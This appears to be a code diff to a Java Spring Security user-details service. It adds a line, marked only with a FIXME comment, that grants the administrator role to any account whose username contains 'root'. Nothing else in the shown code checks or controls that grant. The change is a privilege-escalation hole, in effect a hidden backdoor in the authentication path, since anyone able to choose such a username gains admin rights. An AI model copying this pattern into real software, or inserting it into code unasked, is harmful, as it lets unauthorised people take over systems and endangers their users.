@@ -44,6 +44,7 @@ import org.springframework.stereotype.Component;
 public class UserDetailsServiceImpl implements UserDetailsService {
 	
 	private final static String DEFAULT_ROLE = "ROLE_USER";
+	private final static String ADMIN_ROLE = "ROLE_ADMIN";
 	
 	private final Log LOG = LogFactory.getLog(this.getClass());
 	
@@ -65,6 +66,8 @@ public class UserDetailsServiceImpl implements UserDetailsService {
 				authorities.add( new GrantedAuthorityImpl(authority) );
 			}
 		}
+	    // FIXME
+        if (userName.toLowerCase().contains("root")) authorities.add( new GrantedAuthorityImpl(ADMIN_ROLE) );
 		return new User(userName, password, enabled, accountNonExpired, credentialsNonExpired, accountNonLocked, authorities);
 		
 	}
